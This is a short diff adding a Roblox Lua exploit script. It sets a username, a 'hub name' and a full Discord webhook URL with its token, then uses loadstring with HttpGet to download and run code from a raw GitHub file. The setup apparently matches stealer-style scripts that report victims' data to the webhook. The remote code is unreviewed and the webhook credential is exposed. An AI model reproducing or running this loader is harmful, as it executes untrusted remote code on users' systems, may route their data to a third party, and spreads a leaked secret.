@@ -1,0 +1,5 @@
+_G.Username = "house_oof"
+_G.HubName = "quest hunter"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1099769994860056727/F24DoparSAfntYxj5EZKmkrC67ePNmJt8xg9uMLc3m4vazRwzlwJG0ibru5S-e7qwVTY"
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/trexylol/rexscript/main/main"), true))()
